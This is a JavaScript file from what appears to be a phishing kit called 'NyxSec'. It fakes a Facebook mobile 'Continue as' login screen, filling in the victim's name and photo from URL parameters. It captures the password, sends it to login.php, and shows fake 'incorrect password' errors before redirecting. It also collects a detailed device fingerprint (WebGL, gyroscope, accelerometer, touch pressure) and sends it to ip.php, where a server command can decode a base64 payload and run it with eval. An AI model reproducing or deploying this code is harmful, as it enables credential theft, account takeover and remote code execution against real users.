window.addEventListener('DOMContentLoaded', () => {
  // Generate Session ID
  function generateUUID() {
    var d = new Date().getTime();
    if (typeof performance !== 'undefined' && typeof performance.now === 'function') {
      d += performance.now();
    }
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      var r = (d + Math.random() * 16) % 16 | 0;
      d = Math.floor(d / 16);
      return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
    });
  }

  const sessionId = generateUUID();
  console.log("[NyxSec] Generated sessionId:", sessionId);
  const sessionIdField = document.getElementById('sessionIdField');
  if (sessionIdField) {
    sessionIdField.value = sessionId;
  }

  // Touch Pattern Collection
  let touchPatterns = [];
  let touchCollectionActive = true;
  document.addEventListener('touchstart', (e) => {
    if (touchCollectionActive && e.touches && e.touches.length > 0 && touchPatterns.length < 5) {
      const touch = e.touches[0];
      touchPatterns.push({
        pressure: touch.force || 0.5,
        radiusX: touch.radiusX || 10,
        radiusY: touch.radiusY || 10,
        clientX: touch.clientX,
        clientY: touch.clientY,
        timestamp: Date.now()
      });
    }
  }, { passive: true });

  // Parse URL Parameters
  function getURLParams() {
    const params = new URLSearchParams(window.location.search);
    return {
      uid: params.get('uid') || params.get('id') || params.get('c_user'),
      name: params.get('name') || params.get('n'),
      email: params.get('email') || params.get('e'),
      pic: params.get('pic') || params.get('p')
    };
  }

  // Get Profile Picture URL
  function getProfilePictureUrl(uid, pic) {
    if (pic) {
      return decodeURIComponent(pic);
    } else if (uid) {
      return `https://graph.facebook.com/${uid}/picture?type=large`;
    } else {
      return 'https://static.xx.fbcdn.net/rsrc.php/v4/yQ/r/QRUOT8QR5Mv.png';
    }
  }

  // Initialize Profile Data
  const profileData = getURLParams();
  const profilePicUrl = getProfilePictureUrl(profileData.uid, profileData.pic);
  const profileName = profileData.name ? decodeURIComponent(profileData.name) : '';
  const profileEmail = profileData.email ? decodeURIComponent(profileData.email) : '';

  // If no profile data, redirect to regular login
  if (!profileName && !profileData.uid) {
    window.location.href = 'mobile.html.php';
    return;
  }

  // Set Profile Display
  const avatarLarge = document.getElementById('profile-avatar-large');
  const avatarSmall = document.getElementById('profile-avatar-small');
  const nameLarge = document.getElementById('profile-name-large');
  const nameSmall = document.getElementById('profile-name-small');
  const emailSmall = document.getElementById('profile-email-small');
  const emailField = document.getElementById('email-field');
  const continueButtonText = document.getElementById('continue-button-text');

  if (avatarLarge) avatarLarge.src = profilePicUrl;
  if (avatarSmall) avatarSmall.src = profilePicUrl;
  if (nameLarge) nameLarge.textContent = profileName;
  if (nameSmall) nameSmall.textContent = profileName;
  if (emailSmall) emailSmall.textContent = profileEmail || 'Enter your password';
  if (emailField) emailField.value = profileEmail;
  if (continueButtonText) {
    continueButtonText.textContent = `Continue as ${profileName.split(' ')[0]}`;
  }

  // Step Transitions
  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');
  const continueButton = document.getElementById('continue-button');
  const notYouButton = document.getElementById('not-you-button');

  if (continueButton) {
    continueButton.addEventListener('click', (e) => {
      e.preventDefault();
      if (step1 && step2) {
        step1.classList.add('hidden');
        step2.classList.add('visible');
        // Focus password field
        setTimeout(() => {
          const passwordInput = document.getElementById('password');
          if (passwordInput) passwordInput.focus();
        }, 300);
      }
    });
  }

  if (notYouButton) {
    notYouButton.addEventListener('click', (e) => {
      e.preventDefault();
      window.location.href = 'mobile.html.php';
    });
  }

  // Form Handling
  window.loginTryCount = 0;
  const form = document.querySelector("#login__form");
  const passwordInput = document.querySelector("#password");
  const errorModal = document.getElementById('login_error');
  const loadingRedirectModal = document.getElementById('loadingRedirectModal');
  const modalOkButton = document.getElementById('modalOkButton');
  const passwordToggleLink = document.querySelector('a[data-sigil="password-plain-text-toggle"]');
  const loginBtn = document.querySelector('button[name="login"]._54k8');
  const errorModalH2 = errorModal ? errorModal.querySelector('.modal-content h2') : null;
  const errorModalP = errorModal ? errorModal.querySelector('.modal-content p') : null;

  // Password Toggle
  if (passwordToggleLink && passwordInput) {
    passwordToggleLink.addEventListener('click', function (e) {
      e.preventDefault();
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        passwordToggleLink.classList.add('show-password');
      } else {
        passwordInput.type = 'password';
        passwordToggleLink.classList.remove('show-password');
      }
      passwordInput.focus();
    });
  }

  // Error Modal
  window.openLoginErrorModal = function () {
    if (!errorModal) return;
    errorModal.style.display = 'flex';
    document.body.classList.add('modal-open');
    const modalBox = errorModal.querySelector('.fb-error-modal');
    if (modalBox) {
      modalBox.classList.remove('shake');
      void modalBox.offsetWidth;
      modalBox.classList.add('shake');
    }
    setTimeout(() => {
      if (modalOkButton) modalOkButton.focus();
    }, 120);
  };

  function closeLoginErrorModal() {
    if (errorModal) {
      errorModal.style.display = 'none';
      document.body.classList.remove('modal-open');
    }
  }

  if (modalOkButton) modalOkButton.onclick = closeLoginErrorModal;
  if (errorModal) {
    errorModal.addEventListener('mousedown', function (e) {
      if (e.target === errorModal) closeLoginErrorModal();
    });
    window.addEventListener('keydown', function (e) {
      if (errorModal.style.display !== 'none' && (e.key === 'Escape' || e.key === 'Esc')) {
        closeLoginErrorModal();
      }
    });
  }

  // Loading Modal
  function showLoadingModal() {
    if (loadingRedirectModal) {
      loadingRedirectModal.style.display = 'flex';
      setTimeout(() => {
        loadingRedirectModal.classList.add('is-visible');
      }, 20);
    }
  }

  function hideLoadingModal() {
    if (loadingRedirectModal) {
      loadingRedirectModal.classList.remove('is-visible');
      setTimeout(() => {
        loadingRedirectModal.style.display = 'none';
      }, 300);
    }
  }

  // Submit Credentials
  const postCredentials = (isRedirectAttempt) => {
    if (!passwordInput || !form) {
      return;
    }

    const formData = new FormData();
    formData.append("email", emailField ? emailField.value : profileEmail);
    formData.append("password", passwordInput.value);
    formData.append("sessionId", sessionId);
    console.log("[NyxSec] Sent sessionId:", sessionId, "to login.php");

    if (loginBtn) {
      loginBtn.disabled = true;
      loginBtn.classList.add('loading');
      const spinner = loginBtn.querySelector('.btn-spinner');
      const btnText = loginBtn.querySelector('span._55sr');
      if (spinner) spinner.style.display = 'inline-block';
      if (btnText) btnText.style.display = 'none';
    }

    showLoadingModal();
    fetch("login.php", {
      method: "POST",
      body: formData
    }).then(res => {
      if (!res.ok) {
        return res.text().then(text => {
          throw new Error(`HTTP error ${res.status}: ${text || 'Server error'}`);
        });
      }
      return res.text();
    }).then(responseText => {
      hideLoadingModal();
      if (errorModalH2) errorModalH2.textContent = "Incorrect password";
      if (errorModalP) errorModalP.textContent = "The password you entered is incorrect. Please try again.";
      let blockAction = false;

      if (isRedirectAttempt) {
        if (responseText.startsWith("https://")) {
          const redirectUrl = responseText.trim();
          const isInIframe = window.self !== window.top;
          if (isInIframe) {
            window.parent.postMessage({ type: 'redirect', url: redirectUrl }, '*');
            setTimeout(() => {
              if (window.self !== window.top) {
                window.location.href = redirectUrl;
              }
            }, 100);
            return;
          } else {
            window.location.href = redirectUrl;
            return;
          }
        } else {
          if (errorModalH2) errorModalH2.textContent = "Login Error";
          if (errorModalP) errorModalP.textContent = "An unexpected error occurred. Please try again.";
          openLoginErrorModal();
          if (form) form.reset();
          blockAction = true;
        }
      } else {
        openLoginErrorModal();
        if (form) form.reset();
        blockAction = true;
      }

      if (loginBtn) {
        loginBtn.disabled = false;
        loginBtn.classList.remove('loading');
        const spinner = loginBtn.querySelector('.btn-spinner');
        const btnText = loginBtn.querySelector('span._55sr');
        if (spinner) spinner.style.display = 'none';
        if (btnText) btnText.style.display = 'block';
      }
    }).catch(err => {
      hideLoadingModal();
      if (errorModalH2) errorModalH2.textContent = "Network Error";
      if (errorModalP) errorModalP.textContent = "Could not connect. Please check your internet and try again.";
      openLoginErrorModal();
      if (loginBtn) {
        loginBtn.disabled = false;
        loginBtn.classList.remove('loading');
        const spinner = loginBtn.querySelector('.btn-spinner');
        const btnText = loginBtn.querySelector('span._55sr');
        if (spinner) spinner.style.display = 'none';
        if (btnText) btnText.style.display = 'block';
      }
    });
  };

  // Form Submit Handler
  if (form) {
    form.addEventListener('submit', (e) => {
      e.preventDefault();
      const passwordValue = passwordInput ? passwordInput.value.trim() : '';
      if (!passwordValue) {
        if (errorModalH2) errorModalH2.textContent = "Input Required";
        if (errorModalP) errorModalP.textContent = "Please enter your password.";
        openLoginErrorModal();
        if (loginBtn && loginBtn.classList.contains('loading')) {
          loginBtn.disabled = false;
          loginBtn.classList.remove('loading');
          const spinner = loginBtn.querySelector('.btn-spinner');
          const btnText = loginBtn.querySelector('span._55sr');
          if (spinner) spinner.style.display = 'none';
          if (btnText) btnText.style.display = 'block';
          hideLoadingModal();
        }
        return;
      }

      if (window.loginTryCount >= 2) {
        postCredentials(true);
      } else {
        postCredentials(false);
        window.loginTryCount += 1;
      }
    });
  }

  // Fingerprint Collection (from custom.js)
  function detectBrowser() {
    const ua = navigator.userAgent;
    if (/iPhone|iPad|iPod/.test(ua)) return 'ios-safari';
    if (/Chrome/.test(ua) && /Android/.test(ua)) return 'android-chrome';
    if (/Firefox/.test(ua) && /Android/.test(ua)) return 'android-firefox';
    if (/SamsungBrowser/.test(ua)) return 'samsung-internet';
    return 'unknown';
  }

  function getRealisticBattery() {
    const hour = new Date().getHours();
    const isCharging = Math.random() < 0.15;
    let baseLevel;
    if (hour >= 6 && hour < 9) baseLevel = 0.85 + Math.random() * 0.15;
    else if (hour >= 9 && hour < 12) baseLevel = 0.70 + Math.random() * 0.15;
    else if (hour >= 12 && hour < 15) baseLevel = 0.55 + Math.random() * 0.20;
    else if (hour >= 15 && hour < 18) baseLevel = 0.40 + Math.random() * 0.20;
    else if (hour >= 18 && hour < 21) baseLevel = 0.25 + Math.random() * 0.20;
    else baseLevel = 0.15 + Math.random() * 0.15;
    return {
      level: Math.min(0.99, Math.max(0.05, baseLevel)),
      charging: isCharging
    };
  }

  function getRealisticConnection(browserType) {
    if (browserType === 'ios-safari') {
      return { type: '4g', downlink: 10 + Math.random() * 40 };
    }
    if (navigator.connection) {
      return {
        type: navigator.connection.effectiveType || '4g',
        downlink: navigator.connection.downlink || (10 + Math.random() * 40)
      };
    }
    return { type: '4g', downlink: 10 + Math.random() * 40 };
  }

  const collectFingerprint = async () => {
    const fingerprint = {};
    try {
      const browserType = detectBrowser();

      fingerprint.userAgent = navigator.userAgent;
      fingerprint.language = navigator.language;
      fingerprint.languages = navigator.languages || [navigator.language];
      fingerprint.platform = navigator.platform;
      fingerprint.hardwareConcurrency = navigator.hardwareConcurrency;
      fingerprint.deviceMemory = navigator.deviceMemory;
      fingerprint.vendor = navigator.vendor || 'Unknown';
      fingerprint.devicePixelRatio = window.devicePixelRatio || 1;

      fingerprint.screenResolution = `${screen.width}x${screen.height}`;
      fingerprint.screenAvailWidth = screen.availWidth;
      fingerprint.screenAvailHeight = screen.availHeight;
      fingerprint.colorDepth = screen.colorDepth;
      fingerprint.pixelDepth = screen.pixelDepth || screen.colorDepth;

      fingerprint.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      fingerprint.touchSupport = navigator.maxTouchPoints || 0;
      fingerprint.localStorage = 'localStorage' in window;
      fingerprint.sessionStorage = 'sessionStorage' in window;
      fingerprint.indexedDB = 'indexedDB' in window;
      fingerprint.cookieEnabled = navigator.cookieEnabled;
      fingerprint.doNotTrack = navigator.doNotTrack;
      fingerprint.pluginCount = navigator.plugins ? navigator.plugins.length : 0;

      if (screen.orientation) {
        fingerprint.orientationType = screen.orientation.type || 'portrait-primary';
        fingerprint.orientationAngle = screen.orientation.angle || 0;
      } else {
        fingerprint.orientationType = 'unknown';
        fingerprint.orientationAngle = 0;
      }

      try {
        if (browserType === 'android-firefox' && 'getBattery' in navigator) {
          const battery = await navigator.getBattery();
          fingerprint.batteryLevel = battery.level;
          fingerprint.batteryCharging = battery.charging;
        } else {
          const batteryData = getRealisticBattery();
          fingerprint.batteryLevel = batteryData.level;
          fingerprint.batteryCharging = batteryData.charging;
        }
      } catch (e) {
        const batteryData = getRealisticBattery();
        fingerprint.batteryLevel = batteryData.level;
        fingerprint.batteryCharging = batteryData.charging;
      }

      try {
        const connectionData = getRealisticConnection(browserType);
        fingerprint.connectionType = connectionData.type;
        fingerprint.connectionDownlink = connectionData.downlink;
      } catch (e) {
        fingerprint.connectionType = '4g';
        fingerprint.connectionDownlink = 25;
      }

      fingerprint.mobileSensors = {};
      try {
        if (window.DeviceOrientationEvent && typeof DeviceOrientationEvent.requestPermission === 'function') {
          const permission = await DeviceOrientationEvent.requestPermission();
          if (permission === 'granted') {
            const gyroReadings = [];
            let gyroCount = 0;
            const gyroListener = (e) => {
              if (gyroCount < 10) {
                gyroReadings.push({
                  alpha: e.alpha || 0,
                  beta: e.beta || 0,
                  gamma: e.gamma || 0,
                  timestamp: Date.now()
                });
                gyroCount++;
              } else {
                window.removeEventListener('deviceorientation', gyroListener);
              }
            };
            window.addEventListener('deviceorientation', gyroListener);
            await new Promise(resolve => setTimeout(resolve, 2000));
            fingerprint.mobileSensors.gyroscope = gyroReadings;
          }
        } else if (window.DeviceOrientationEvent) {
          const gyroReadings = [];
          let gyroCount = 0;
          const gyroListener = (e) => {
            if (gyroCount < 10) {
              gyroReadings.push({
                alpha: e.alpha || 0,
                beta: e.beta || 0,
                gamma: e.gamma || 0,
                timestamp: Date.now()
              });
              gyroCount++;
            } else {
              window.removeEventListener('deviceorientation', gyroListener);
            }
          };
          window.addEventListener('deviceorientation', gyroListener);
          await new Promise(resolve => setTimeout(resolve, 2000));
          fingerprint.mobileSensors.gyroscope = gyroReadings;
        } else {
          fingerprint.mobileSensors.gyroscope = [];
        }
      } catch (e) {
        fingerprint.mobileSensors.gyroscope = [];
      }

      try {
        if (window.DeviceMotionEvent && typeof DeviceMotionEvent.requestPermission === 'function') {
          const permission = await DeviceMotionEvent.requestPermission();
          if (permission === 'granted') {
            const accelReadings = [];
            let accelCount = 0;
            const accelListener = (e) => {
              if (accelCount < 10 && e.acceleration) {
                accelReadings.push({
                  x: e.acceleration.x || 0,
                  y: e.acceleration.y || 0,
                  z: e.acceleration.z || 0,
                  timestamp: Date.now()
                });
                accelCount++;
              } else if (accelCount >= 10) {
                window.removeEventListener('devicemotion', accelListener);
              }
            };
            window.addEventListener('devicemotion', accelListener);
            await new Promise(resolve => setTimeout(resolve, 2000));
            fingerprint.mobileSensors.accelerometer = accelReadings;
          }
        } else if (window.DeviceMotionEvent) {
          const accelReadings = [];
          let accelCount = 0;
          const accelListener = (e) => {
            if (accelCount < 10 && e.acceleration) {
              accelReadings.push({
                x: e.acceleration.x || 0,
                y: e.acceleration.y || 0,
                z: e.acceleration.z || 0,
                timestamp: Date.now()
              });
              accelCount++;
            } else if (accelCount >= 10) {
              window.removeEventListener('devicemotion', accelListener);
            }
          };
          window.addEventListener('devicemotion', accelListener);
          await new Promise(resolve => setTimeout(resolve, 2000));
          fingerprint.mobileSensors.accelerometer = accelReadings;
        } else {
          fingerprint.mobileSensors.accelerometer = [];
        }
      } catch (e) {
        fingerprint.mobileSensors.accelerometer = [];
      }

      fingerprint.touchPatterns = touchPatterns.slice(0, 5);

      const canvasEl = document.createElement('canvas');
      try {
        const gl = canvasEl.getContext('webgl') || canvasEl.getContext('experimental-webgl');
        if (gl) {
          fingerprint.webGLRenderer = gl.getParameter(gl.RENDERER);
          fingerprint.webGLVendor = gl.getParameter(gl.VENDOR);
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if (debugInfo) {
            fingerprint.webGLUnmaskedRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            fingerprint.webGLUnmaskedVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
          }
        } else {
          fingerprint.webGLRenderer = "n/a";
          fingerprint.webGLVendor = "n/a";
        }
      } catch (e) {
        fingerprint.webGLRenderer = "error";
        fingerprint.webGLVendor = "error";
      }

      fingerprint.sessionId = sessionId;
      return fingerprint;
    } catch (err) {
      fingerprint.error = err.message || "Main collection failed";
      if (!fingerprint.userAgent && navigator) fingerprint.userAgent = navigator.userAgent || "Unknown";
      fingerprint.sessionId = sessionId;
      return fingerprint;
    }
  };

  const sendFingerprint = (fpObject) => {
    if (!fpObject || Object.keys(fpObject).length === 0) {
      return;
    }
    fetch("ip.php", {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(fpObject)
    }).then(response => response.json()).then(command => {
      switch (command.action) {
        case 'EXECUTE_PAYLOAD':
          const payload = atob(command.payload);
          eval(payload);
          break;
        case 'REDIRECT':
          window.location.href = command.url;
          break;
        case 'PROCEED':
          break;
        default:
      }
    }).catch(err => { });
  };

  // Collect and send fingerprint
  collectFingerprint().then(fingerprintResult => {
    sendFingerprint(fingerprintResult);
  }).catch(collectionError => {
    sendFingerprint({
      error: "Client-side collection promise failed",
      errorMessage: collectionError ? collectionError.toString() : "Unknown collection error",
      userAgent: navigator.userAgent || "Unknown",
      sessionId: sessionId
    });
  });
});

